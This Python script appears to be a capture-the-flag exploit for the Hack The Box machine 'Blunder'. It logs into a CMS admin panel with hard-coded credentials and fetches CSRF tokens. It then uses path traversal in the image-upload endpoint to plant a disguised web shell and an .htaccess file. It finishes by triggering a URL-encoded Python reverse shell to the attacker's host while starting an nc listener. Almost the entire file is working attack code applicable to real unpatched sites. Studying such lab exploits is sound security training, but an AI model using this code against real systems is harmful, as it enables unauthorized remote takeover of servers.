#!/usr/bin/env python3
import os
import re
import sys
import time
import requests
import threading


# Login as our admin user
def login():
    print(f"[+] Attempting to login as {username}")

    login_url = host + "/admin/login"
    csrf_token = get_csrf_token(login_url)

    # Perform the login request
    login_response = session.post(login_url, data={
        "tokenCSRF": csrf_token,
        "username": username,
        "password": password,
        "save": ""
    })

    if "/admin/dashboard" in login_response.url:
        print("[+] Login was successful!")
        return True

    return False


def upload_file(file_name, file_path):
    print(f"[+] Uploading file: {file_path}")
    upload_url = host + "/admin/ajax/upload-images"
    csrf_token = get_csrf_token(host + "/admin/dashboard")

    response = session.post(upload_url, files={
        "images[]": (file_name, open(file_path, "rb")),
        "uuid": (None, "../../tmp"),
        "tokenCSRF": (None, csrf_token)
    })

    if "Images uploaded" in response.text or ("File type is not supported" in response.text and file_name == ".htaccess"):
        print("[+] File uploaded successfully!")
        return True
    else:
        print("[!] Couldn't upload file, failed with error:")
        print(f"[!] {response.text}")
        sys.exit(1)


def trigger_backconnect():
    print("[+] Popping shell in 3, 2, 1...")
    time.sleep(3)
    command = "export%20RHOST%3D%22%7B%23LHOST%23%7D%22%3Bexport%20RPORT%3D%7B%23LPORT%23%7D%3Bpython2%20-c%20%27import%20sys%2Csocket%2Cos%2Cpty%3Bs%3Dsocket.socket()%3Bs.connect((os.getenv(%22RHOST%22)%2Cint(os.getenv(%22RPORT%22))))%3B%5Bos.dup2(s.fileno()%2Cfd)%20for%20fd%20in%20(0%2C1%2C2)%5D%3Bpty.spawn(%22%2Fbin%2Fsh%22)%27"
    command = command.replace('%7B%23LHOST%23%7D', local_host)
    command = command.replace('%7B%23LPORT%23%7D', local_port)
    print("[+] POPPED!")
    session.get(host + "/bl-content/tmp/shell.png?cmd=" + command)


def listen_and_trigger():
    print("[+] Starting listener and triggering backconnect")

    # Start background thread that sleeps for 3 second and performs the backconnect
    thread = threading.Thread(target=trigger_backconnect)
    thread.start()

    # Start our listener
    os.system("nc -nvlp " + local_port)


def exploit():
    print("[+] Beginning exploit...")
    upload_file("shell.png", "files/shell.png")
    upload_file(".htaccess", "files/.htaccess")
    print("[+] Shell uploaded: " + host + "/bl-content/tmp/shell.png")
    listen_and_trigger()


# Retrieve the CSRF token for the current page
def get_csrf_token(url):
    response = session.get(url)

    # Sometimes the token is stored as an input element, othertimes it is embedded in JavaScript
    if (search := re.search('input.+?name="tokenCSRF".+?value="(.+?)"', response.text)) is not None:
        return search.group(1)
    elif (search := re.search('var.+?tokenCSRF.+?=.+?"(.+?)"', response.text)) is not None:
        return search.group(1)
    else:
        print("[!] Failed to retrieve required CSRF token")
        sys.exit(1)


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: htb-blunder.py {LHOST} {LPORT}")
        sys.exit(1)

    local_host = sys.argv[1]
    local_port = sys.argv[2]
    host = "http://10.10.10.191"
    username = "fergus"
    password = "RolandDeschain"

    # Create a persistent session
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
    })

    if login():
        exploit()
    else:
        print("[!] Failed to login, is the username and password correct?")
